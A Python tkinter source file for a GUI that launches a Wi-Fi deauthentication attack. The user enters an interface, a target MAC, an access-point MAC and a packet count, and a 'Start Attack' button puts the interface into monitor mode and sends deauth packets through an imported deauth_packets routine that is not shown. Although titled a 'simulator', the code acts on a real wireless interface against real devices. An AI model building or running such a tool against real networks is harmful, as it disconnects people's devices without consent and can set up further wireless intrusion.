import tkinter as tk
from tkinter import messagebox
from monitor_mode import enable_monitor, disable_monitor
from deauth_attack import deauth_packets
import threading

class DeauthSimulatorApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Wi-Fi Deauthentication Attack Simulator")
        self.root.geometry("400x300")

        # Interface input
        tk.Label(root, text="Interface:").pack(pady=5)
        self.interface_entry = tk.Entry(root)
        self.interface_entry.pack()

        # Target MAC
        tk.Label(root, text="Target MAC Address:").pack(pady=5)
        self.target_entry = tk.Entry(root)
        self.target_entry.pack()

        # AP MAC
        tk.Label(root, text="AP MAC Address:").pack(pady=5)
        self.ap_entry = tk.Entry(root)
        self.ap_entry.pack()

        # Packet count
        tk.Label(root, text="Packet Count:").pack(pady=5)
        self.count_entry = tk.Entry(root)
        self.count_entry.insert(0, "100")
        self.count_entry.pack()

        # Attack Button
        self.attack_button = tk.Button(root, text="Start Attack", command=self.start_attack_thread)
        self.attack_button.pack(pady=15)

    def start_attack_thread(self):
        threading.Thread(target=self.start_attack, daemon=True).start()

    def start_attack(self):
        interface = self.interface_entry.get()
        target_mac = self.target_entry.get()
        ap_mac = self.ap_entry.get()
        count = int(self.count_entry.get())

        try:
            enable_monitor(interface)
            messagebox.showinfo("Started", "Monitor mode enabled.\nSending deauth packets...")
            deauth_packets(target_mac, ap_mac, interface, count)
            messagebox.showinfo("Done", f"Sent {count} deauth packets.")
        except Exception as e:
            messagebox.showerror("Error", str(e))
        finally:
            disable_monitor(interface)

